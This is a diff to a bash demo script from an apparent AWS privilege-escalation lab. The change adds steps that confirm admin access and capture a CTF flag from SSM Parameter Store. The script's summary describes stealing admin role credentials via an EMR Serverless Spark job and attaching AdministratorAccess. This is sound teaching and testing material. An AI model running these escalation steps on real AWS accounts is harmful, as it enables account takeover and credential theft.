@@ -1,4 +1,5 @@
 #!/bin/bash
+set -e
 
 # Demo script for iam:PassRole + emr-serverless:CreateApplication + emr-serverless:StartJobRun privilege escalation
 # This scenario demonstrates how a user with PassRole, CreateApplication, and StartJobRun can escalate
@@ -107,6 +108,14 @@ use_readonly_creds() {
     export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
     unset AWS_SESSION_TOKEN
 }
+
+# Source demo permissions library for validation restriction
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"
+
+# Restrict helpful permissions during validation run
+restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 
 # Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
@@ -361,9 +370,11 @@ sleep 15
 echo -e "${GREEN}✓ Policy propagation complete${NC}\n"
 
 # [OBSERVATION]
-# Step 13: Verify privilege escalation
+# Step 13: Verify AdministratorAccess attachment using readonly creds
+# (iam:ListAttachedUserPolicies is a "helpful" permission for the starting user
+# and is explicitly denied during the restriction window — observe via ReadOnly.)
 use_readonly_creds
-echo -e "${YELLOW}Step 13: Verifying privilege escalation${NC}"
+echo -e "${YELLOW}Step 13: [OBSERVATION] Verifying AdministratorAccess attachment${NC}"
 echo "Checking if AdministratorAccess is now attached to starting user..."
 
 show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output json"
@@ -382,8 +393,12 @@ else
 fi
 echo ""
 
-echo "Attempting to list IAM users..."
-show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
+# [EXPLOIT]
+# Step 14: Confirm admin access using the starting user's now-elevated credentials
+use_starting_creds
+echo -e "${YELLOW}Step 14: Confirming administrator access (as starting user)${NC}"
+echo "Attempting to list IAM users with the starting user's now-elevated credentials..."
+show_attack_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -397,9 +412,30 @@ echo ""
 # Clean up temporary files
 rm -f /tmp/stolen_creds.json
 
+# [EXPLOIT]
+# Step 15: Capture the CTF flag
+# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
+# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
+use_starting_creds
+echo -e "${YELLOW}Step 15: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/emr-serverless-001-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with iam:PassRole, emr-serverless:CreateApplication, emr-serverless:StartJobRun)"
@@ -409,12 +445,14 @@ echo "4. Started job run with admin execution role ($ADMIN_ROLE_NAME)"
 echo "5. Spark job exfiltrated admin role credentials to S3 (IAM not reachable without VPC)"
 echo "6. Retrieved stolen credentials and used them to attach AdministratorAccess to $STARTING_USER"
 echo "7. Achieved: Administrator Access"
+echo "8. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER → (emr-serverless:CreateApplication) → Spark application"
 echo "  → (iam:PassRole + emr-serverless:StartJobRun with $ADMIN_ROLE_NAME)"
 echo "  → Spark job exfiltrates admin creds to S3"
 echo "  → Attacker retrieves creds → (iam:AttachUserPolicy) → Admin"
+echo "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
